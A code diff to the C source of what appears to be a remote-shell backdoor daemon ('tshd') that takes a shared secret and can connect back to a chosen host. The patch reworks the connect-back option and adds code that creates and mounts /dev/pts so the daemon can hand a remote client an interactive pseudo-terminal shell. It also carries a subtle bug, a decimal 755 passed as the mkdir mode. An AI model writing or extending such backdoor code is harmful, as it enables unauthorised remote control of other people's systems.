@@ -6,6 +6,8 @@
 
 #include <sys/types.h>
 #include <sys/socket.h>
+#include <sys/stat.h>
+#include <sys/mount.h>
 #include <netinet/in.h>
 #include <sys/ioctl.h>
 #include <sys/wait.h>
@@ -55,7 +57,7 @@ int tshd_runshell( int client );
 
 void usage(char *argv0)
 {
-    fprintf(stderr, "Usage: %s [ -c [ connect_back_host ] ] [ -s secret ] [ -p port ]\n", argv0);
+    fprintf(stderr, "Usage: %s [ -c[connect_back_host] ] [ -s secret ] [ -p port ]\n", argv0);
     exit(1);
 }
 
@@ -83,13 +85,15 @@ int main( int argc, char **argv )
             case 's':
                 secret=optarg; /* We hope ... */
                 break;
-			case 'c':
-				if (optarg == NULL) {
-					cb_host = CONNECT_BACK_HOST;
-				} else {
-					cb_host = optarg;
-				}
-				break;
+            case 'c':
+                /* WRONG: -c 192.168.1.3 */
+                /* RIGHT: -c192.168.1.3 */
+		if (optarg == NULL) {
+                    cb_host = CONNECT_BACK_HOST;
+                } else {
+                    cb_host = optarg;
+                }
+                break;
             default: /* '?' */
                 usage(*argv);
                 break;
@@ -441,11 +445,22 @@ int tshd_runshell( int client )
     struct winsize ws;
     char *slave, *temp, *shell;
     int ret, len, pid, pty, tty, n;
-
+    struct stat sb;
+	
     /* request a pseudo-terminal */
 
 #if defined LINUX || defined FREEBSD || defined OPENBSD || defined OSF
+    /* openpty() depends on /dev/pts.
+       some systems have /dev/pts support but don't have it enabled by default.
+       let's enable it */
+    if(!((stat("/dev/pts", &sb) == 0) && S_ISDIR(sb.st_mode))) {
+        // system("/bin/mkdir /dev/pts");
+        mkdir("/dev/pts", 755);
+        // system("/bin/mount -t devpts devpts /dev/pts");
+        mount("devpts", "/dev/pts", "devpts", 0, "");
 
+    }
+	
     if( openpty( &pty, &tty, NULL, NULL, NULL ) < 0 )
     {
         return( 24 );
